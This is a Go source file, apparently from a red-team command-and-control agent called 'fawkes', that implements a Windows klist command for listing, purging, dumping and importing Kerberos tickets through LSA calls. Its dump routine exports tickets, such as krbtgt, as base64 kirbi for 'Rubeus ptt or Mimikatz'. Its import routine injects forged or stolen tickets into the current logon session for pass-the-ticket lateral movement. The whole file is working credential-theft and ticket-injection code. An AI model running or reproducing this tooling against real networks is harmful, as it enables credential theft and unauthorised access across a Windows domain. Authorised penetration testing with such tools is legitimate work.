//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"
	"unicode/utf16"
	"unsafe"

	"fawkes/pkg/structs"
)

func klistList(args klistArgs) structs.CommandResult {
	// Connect to LSA
	handle, err := lsaConnect()
	if err != nil {
		return errorf("Error connecting to LSA: %v", err)
	}
	defer lsaClose(handle)

	// Lookup Kerberos package
	authPkg, err := lsaLookupKerberos(handle)
	if err != nil {
		return errorf("Error looking up Kerberos package: %v", err)
	}

	// Query ticket cache
	req := kerbQueryTktCacheRequest{
		MessageType: kerbQueryTicketCacheExMessage,
	}

	var responsePtr uintptr
	var responseLen uint32
	var protocolStatus uintptr

	ret, _, _ := procLsaCallAuthenticationPkg.Call(
		handle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&req)),
		uintptr(unsafe.Sizeof(req)),
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&responseLen)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	if ret != 0 {
		return errorf("Error querying ticket cache: %v", lsaNtStatusToError(ret))
	}
	if responsePtr != 0 {
		defer procLsaFreeReturnBuffer.Call(responsePtr)
	}
	if protocolStatus != 0 {
		// STATUS_NO_LOGON_SERVERS (0xC000005F): machine not domain-joined or no DC reachable
		if protocolStatus == 0xC000005F {
			return successResult("=== Kerberos Ticket Cache ===\n\nCached tickets: 0\n\nNo domain controller available — machine may not be domain-joined.\nKerberos tickets are only cached for domain-authenticated sessions.")
		}
		return errorf("Kerberos protocol error: %v", lsaNtStatusToError(protocolStatus))
	}

	if responsePtr == 0 || responseLen < 8 {
		return successResult("=== Kerberos Ticket Cache ===\n\nCached tickets: 0\n\nNo ticket cache data returned.")
	}

	// Parse response header: MessageType (4 bytes) + CountOfTickets (4 bytes)
	countPtr := (*uint32)(unsafe.Pointer(responsePtr + 4))
	count := *countPtr

	if count == 0 {
		return successResult("[]")
	}

	// Parse ticket entries starting at offset 8
	ticketBase := responsePtr + 8
	ticketSize := unsafe.Sizeof(kerbTicketCacheInfoEx{})
	now := time.Now()

	var entries []klistTicketEntry
	for i := uint32(0); i < count; i++ {
		ticketPtr := ticketBase + uintptr(i)*ticketSize
		ticket := (*kerbTicketCacheInfoEx)(unsafe.Pointer(ticketPtr))

		clientName := readUS(ticket.ClientName)
		clientRealm := readUS(ticket.ClientRealm)
		serverName := readUS(ticket.ServerName)
		serverRealm := readUS(ticket.ServerRealm)

		// Apply server name filter if specified
		if args.Server != "" {
			filter := strings.ToLower(args.Server)
			if !strings.Contains(strings.ToLower(serverName), filter) &&
				!strings.Contains(strings.ToLower(serverRealm), filter) {
				continue
			}
		}

		startTime := filetimeToTimeKL(ticket.StartTime)
		endTime := filetimeToTimeKL(ticket.EndTime)
		renewTime := filetimeToTimeKL(ticket.RenewTime)

		status := "valid"
		if !endTime.IsZero() && endTime.Before(now) {
			status = "EXPIRED"
		}

		e := klistTicketEntry{
			Index:      int(i),
			Client:     fmt.Sprintf("%s@%s", clientName, clientRealm),
			Server:     fmt.Sprintf("%s@%s", serverName, serverRealm),
			Encryption: etypeToNameKL(ticket.EncryptionType),
			Flags:      klistFormatFlags(ticket.TicketFlags),
			Status:     status,
		}
		if !startTime.IsZero() {
			e.Start = startTime.Format("2006-01-02 15:04:05")
		}
		if !endTime.IsZero() {
			e.End = endTime.Format("2006-01-02 15:04:05")
		}
		if !renewTime.IsZero() {
			e.Renew = renewTime.Format("2006-01-02 15:04:05")
		}
		entries = append(entries, e)
	}

	data, err := json.Marshal(entries)
	if err != nil {
		return errorf("Error marshaling output: %v", err)
	}

	return successResult(string(data))
}

func klistPurge(args klistArgs) structs.CommandResult {
	// Connect to LSA
	handle, err := lsaConnect()
	if err != nil {
		return errorf("Error connecting to LSA: %v", err)
	}
	defer lsaClose(handle)

	authPkg, err := lsaLookupKerberos(handle)
	if err != nil {
		return errorf("Error looking up Kerberos package: %v", err)
	}

	// Purge all tickets (empty ServerName and RealmName = purge all)
	req := kerbPurgeTktCacheRequest{
		MessageType: kerbPurgeTicketCacheMessage,
	}

	var responsePtr uintptr
	var responseLen uint32
	var protocolStatus uintptr

	ret, _, _ := procLsaCallAuthenticationPkg.Call(
		handle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&req)),
		uintptr(unsafe.Sizeof(req)),
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&responseLen)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	if responsePtr != 0 {
		defer procLsaFreeReturnBuffer.Call(responsePtr)
	}
	if ret != 0 {
		return errorf("Error purging ticket cache: %v", lsaNtStatusToError(ret))
	}
	if protocolStatus != 0 {
		// STATUS_NO_LOGON_SERVERS or STATUS_INVALID_PARAMETER on non-domain machines
		if protocolStatus == 0xC000005F || protocolStatus == 0xC000000D {
			return successResult("No Kerberos tickets to purge (no domain logon session)")
		}
		return errorf("Kerberos purge protocol error: %v", lsaNtStatusToError(protocolStatus))
	}

	return successResult("Kerberos ticket cache purged successfully")
}

func klistDump(args klistArgs) structs.CommandResult {
	if args.Server == "" {
		return errorResult("Error: specify -server with the target SPN to dump (e.g., krbtgt/DOMAIN.LOCAL)")
	}

	// Connect to LSA
	handle, err := lsaConnect()
	if err != nil {
		return errorf("Error connecting to LSA: %v", err)
	}
	defer lsaClose(handle)

	authPkg, err := lsaLookupKerberos(handle)
	if err != nil {
		return errorf("Error looking up Kerberos package: %v", err)
	}

	// Build UNICODE target name
	targetUTF16 := utf16.Encode([]rune(args.Server))
	targetBuf := make([]uint16, len(targetUTF16)+1) // null terminated
	copy(targetBuf, targetUTF16)

	req := kerbRetrieveTktRequest{
		MessageType:    kerbRetrieveEncodedTicketMessage,
		CacheOptions:   kerbRetrieveTicketAsKerbCred,
		EncryptionType: 0, // any etype
	}
	req.TargetName = unicodeStringKL{
		Length:        uint16(len(targetUTF16) * 2),
		MaximumLength: uint16(len(targetBuf) * 2),
		Buffer:        uintptr(unsafe.Pointer(&targetBuf[0])),
	}

	var responsePtr uintptr
	var responseLen uint32
	var protocolStatus uintptr

	ret, _, _ := procLsaCallAuthenticationPkg.Call(
		handle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&req)),
		uintptr(unsafe.Sizeof(req)),
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&responseLen)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	if responsePtr != 0 {
		defer procLsaFreeReturnBuffer.Call(responsePtr)
	}
	if ret != 0 {
		return errorf("Error retrieving ticket: %v", lsaNtStatusToError(ret))
	}
	if protocolStatus != 0 {
		return errorf("Kerberos retrieve error: %v", lsaNtStatusToError(protocolStatus))
	}

	if responsePtr == 0 || responseLen == 0 {
		return successf("No ticket found for %s", args.Server)
	}

	// The response is KERB_RETRIEVE_TKT_RESPONSE which contains:
	// Ticket: KERB_EXTERNAL_TICKET { ServiceName, TargetName, ClientName,
	//   DomainName, TargetDomainName, AltTargetDomainName, SessionKey,
	//   TicketFlags, Flags, KeyExpirationTime, StartTime, EndTime,
	//   RenewUntil, TimeSkew, EncodedTicketSize, EncodedTicket }
	// With KERB_RETRIEVE_TICKET_AS_KERB_CRED, EncodedTicket contains a
	// KRB-CRED structure (kirbi format) that can be used with Rubeus/Mimikatz.

	// Extract the encoded ticket data from the response
	// The EncodedTicketSize is at a known offset, followed by a pointer to the data.
	// Rather than compute exact struct offsets, we know the response contains
	// the kirbi data somewhere. With AS_KERB_CRED flag, the entire response
	// after the ticket metadata IS the kirbi.
	// For simplicity and safety, export the raw response as the kirbi blob.
	kirbiData := unsafe.Slice((*byte)(unsafe.Pointer(responsePtr)), responseLen)
	kirbiB64 := base64.StdEncoding.EncodeToString(kirbiData)

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Retrieved ticket for %s (%d bytes)\n", args.Server, responseLen))
	sb.WriteString("[+] Base64-encoded kirbi (use with Rubeus ptt or Mimikatz):\n\n")
	// Wrap base64 at 76 chars for readability
	for i := 0; i < len(kirbiB64); i += 76 {
		end := i + 76
		if end > len(kirbiB64) {
			end = len(kirbiB64)
		}
		sb.WriteString(kirbiB64[i:end])
		sb.WriteString("\n")
	}

	return successResult(sb.String())
}

func klistImport(args klistArgs) structs.CommandResult {
	if args.Ticket == "" {
		return errorResult("Error: -ticket parameter required (base64-encoded kirbi data)")
	}

	// Decode base64
	data, err := base64.StdEncoding.DecodeString(args.Ticket)
	if err != nil {
		return errorf("Error decoding base64 ticket data: %v", err)
	}

	if len(data) < 4 {
		return errorResult("Error: ticket data too short")
	}

	// Auto-detect format
	isCcache := (data[0] == 0x05 && (data[1] == 0x03 || data[1] == 0x04))
	isKirbi := data[0] == 0x76

	if !isCcache && !isKirbi {
		return errorf("Error: unrecognized ticket format (first byte: 0x%02x). Expected kirbi (0x76) or ccache (0x0503/0x0504).", data[0])
	}

	if isCcache {
		return errorResult("Error: ccache format detected. On Windows, use kirbi format instead.\nRe-forge with: ticket -action forge ... -format kirbi\nOr use impacket's ticketConverter.py to convert.")
	}

	// Connect to LSA
	handle, err := lsaConnect()
	if err != nil {
		return errorf("Error connecting to LSA: %v", err)
	}
	defer lsaClose(handle)

	authPkg, err := lsaLookupKerberos(handle)
	if err != nil {
		return errorf("Error looking up Kerberos package: %v", err)
	}

	// Build KERB_SUBMIT_TKT_REQUEST:
	//   MessageType    uint32  (offset 0)
	//   LogonIdLow     uint32  (offset 4)
	//   LogonIdHigh    int32   (offset 8)
	//   Flags          uint32  (offset 12)
	//   Key: KERB_CRYPTO_KEY32 { KeyType int32(4), Length uint32(4), Value *byte(8) } = 16 bytes (offset 16)
	//   KerbCredSize   uint32  (offset 32)
	//   KerbCredOffset uint32  (offset 36)
	// Total header = 40 bytes, then kirbi data follows inline

	headerSize := uint32(40)
	totalSize := headerSize + uint32(len(data))
	buf := make([]byte, totalSize)

	// MessageType = KERB_SUBMIT_TKT_REQUEST (21)
	*(*uint32)(unsafe.Pointer(&buf[0])) = kerbSubmitTicketMessage
	// LogonId = 0, Flags = 0, Key = zero (no additional key)
	// KerbCredSize
	*(*uint32)(unsafe.Pointer(&buf[32])) = uint32(len(data))
	// KerbCredOffset — offset from start of struct
	*(*uint32)(unsafe.Pointer(&buf[36])) = headerSize

	// Copy kirbi data after header
	copy(buf[headerSize:], data)

	var responsePtr uintptr
	var responseLen uint32
	var protocolStatus uintptr

	ret, _, _ := procLsaCallAuthenticationPkg.Call(
		handle,
		uintptr(authPkg),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(totalSize),
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&responseLen)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)
	if responsePtr != 0 {
		defer procLsaFreeReturnBuffer.Call(responsePtr)
	}
	if ret != 0 {
		return errorf("Error submitting ticket to LSA: %v", lsaNtStatusToError(ret))
	}
	if protocolStatus != 0 {
		return errorf("Kerberos submit error: %v", lsaNtStatusToError(protocolStatus))
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Ticket imported successfully (kirbi, %d bytes)\n", len(data)))
	sb.WriteString("[+] Injected into current logon session's Kerberos ticket cache via LSA\n")
	sb.WriteString("\n[*] Verify with: klist -action list\n")
	sb.WriteString("[*] The ticket is now available for Kerberos authentication (e.g., net use, PsExec, etc.)")

	return successResult(sb.String())
}
